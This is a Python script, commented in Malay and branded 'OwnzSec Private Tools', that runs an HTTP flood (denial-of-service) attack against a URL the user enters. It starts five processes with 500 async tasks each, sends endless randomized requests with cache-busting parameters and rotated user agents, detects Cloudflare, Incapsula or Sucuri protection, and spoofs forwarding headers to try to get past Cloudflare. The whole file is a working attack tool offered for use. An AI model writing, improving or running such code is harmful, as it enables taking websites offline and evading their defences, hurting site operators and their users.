import threading  
import aiohttp  
import asyncio  
import sys  
import time  
import random  
import string  
import os  
import pyfiglet  
from multiprocessing import Process  
from colorama import Fore, Style, init  
  
# Inisialisasi colorama  
init(autoreset=True)  
  
# Bersihkan terminal sebelum mula  
os.system("clear" if sys.platform == "linux" else "cls")  
  
# Banner utama  
def print_banner():  
    banner_text = pyfiglet.figlet_format("OwnzSec")  
    border = "=" * 60  
    print(Fore.CYAN + border)  
    print(Fore.RED + banner_text)  
    print(Fore.CYAN + border)  
    print(Fore.YELLOW + "⚡G Creayted by Adxxm⚡   ".center(60))  
    print(Fore.GREEN + "🚀 OwnzSec Private Tools 🚀".center(60))  
    print(Fore.CYAN + border)  
  
# Efek menaip untuk teks khas  
def typing_effect(text, color=Fore.WHITE, delay=0.05):  
    for char in text:  
        sys.stdout.write(color + char + Style.RESET_ALL)  
        sys.stdout.flush()  
        time.sleep(delay)  
    print()  
  
# Tampilkan banner dengan efek dramatik  
print_banner()  
typing_effect(">>> SYSTEM INITIALIZED...", Fore.YELLOW, delay=0.03)  
typing_effect(">>> PROTOCOL ENGAGED...", Fore.YELLOW, delay=0.03)  
typing_effect(">>> CONNECTION SECURED...\n", Fore.YELLOW, delay=0.03)  
  
# Input URL sasaran  
url = input(Fore.GREEN + "🔗 Masukkan URL Web -> ").strip()  
if not url.startswith("http"):  
    url = "http://" + url  
  
print(Fore.BLUE + f"\n[+] URL Sasaran: {url}")  
time.sleep(1)  
  
# Senarai HTTP methods yang digunakan  
http_methods = ["GET", "POST", "PUT", "DELETE"]  
  
# Fungsi untuk buat string rawak  
def random_string(length=10):  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  
  
# Fungsi buat URL unik dengan parameter rawak  
def random_url(url):  
    return f"{url}?random={random_string(10)}"  
  
# Fungsi auto detect WAF  
async def detect_waf(session, url):  
    try:  
        async with session.get(url) as response:  
            headers = response.headers  
            waf_detected = False  
  
            if "Server" in headers and any(waf in headers["Server"] for waf in ["cloudflare", "incapsula", "sucuri"]):  
                waf_detected = headers["Server"]  
            elif "cf-ray" in headers or "cf-cache-status" in headers:  
                waf_detected = "Cloudflare"  
            elif "X-Iinfo" in headers:  
                waf_detected = "Incapsula"  
  
            if waf_detected:  
                print(Fore.RED + f"[⚠] WAF Dikesan: {waf_detected}")  
                return waf_detected  
            else:  
                print(Fore.GREEN + "[✅] Tiada WAF dikesan.")  
                return None  
    except Exception as e:  
        print(Fore.YELLOW + f"[!] Ralat semasa mengesan WAF: {e}")  
        return None  
  
# Fungsi utama serangan dengan bypass WAF dan random delay  
async def fetch(session, url, waf_detected):  
    start_time = time.time()  
    while True:  
        try:  
            method = random.choice(http_methods)  # Pilih method rawak  
            target_url = random_url(url)  
            delay = random.uniform(0.1, 1.5)  # Random delay (0.1s - 1.5s)  
  
            # Header manipulasi jika WAF dikesan  
            custom_headers = {  
                "User-Agent": random.choice([  
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",  
                    "Mozilla/5.0 (Linux; Android 10)",  
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"  
                ]),  
                "Referer": url,  
                "X-Requested-With": "XMLHttpRequest",  
                "Connection": "keep-alive"  
            }  
  
            # Tambah header khas untuk bypass Cloudflare  
            if waf_detected == "Cloudflare":  
                custom_headers["CF-Connecting-IP"] = f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"  
                custom_headers["X-Forwarded-For"] = f"192.168.{random.randint(0,255)}.{random.randint(0,255)}"  
  
            data = {"random_data": random_string(20)} if method in ["POST", "PUT"] else None  
  
            async with session.request(method, target_url, headers=custom_headers, data=data) as response:  
                elapsed_time = round(time.time() - start_time, 2)  
                  
                if response.status == 200:  
                    print(f"{Fore.GREEN}[+] Berjaya Mengetuk Server: {elapsed_time}s | Method: {method} | Status: {response.status}")  
                else:  
                    print(f"{Fore.RED}[-] Gagal: {elapsed_time}s | Method: {method} | Status: {response.status}")  
  
            await asyncio.sleep(delay)  # Tambah delay rawak supaya nampak lebih realistik  
                      
        except aiohttp.ClientError as e:  
            print(f"{Fore.RED}[-] Gagal Mengetuk Server: {e}")  
            await asyncio.sleep(1)  
        except Exception as e:  
            print(f"{Fore.YELLOW}[-] Ralat Tidak Dijangka: {e}")  
            break    
  
# Fungsi async utama  
async def main():  
    tasks = []  
    async with aiohttp.ClientSession(  
        connector=aiohttp.TCPConnector(ssl=False, use_dns_cache=False, limit=0, force_close=False, enable_cleanup_closed=True)  
    ) as session:  
        waf_detected = await detect_waf(session, url)  # Auto detect WAF  
        for _ in range(500):  # Jumlah tugas async  
            tasks.append(fetch(session, url, waf_detected))  
        await asyncio.gather(*tasks)  
  
# Jalankan serangan dalam multiprocessing  
def start_attack():  
    while True:  
        try:  
            asyncio.run(main())  
        except Exception as e:  
            print(f"{Fore.RED}[!] Mengulang Serangan... Ralat: {e}")  
  
if __name__ == '__main__':  
    processes = []  
    for i in range(5):  # Jalankan 5 proses serentak  
        p = Process(target=start_attack)  
        p.start()  
        processes.append(p)  
        print(Fore.CYAN + f"[+] Proses {i+1} dimulakan...")  
  
    for p in processes:  
        p.join()
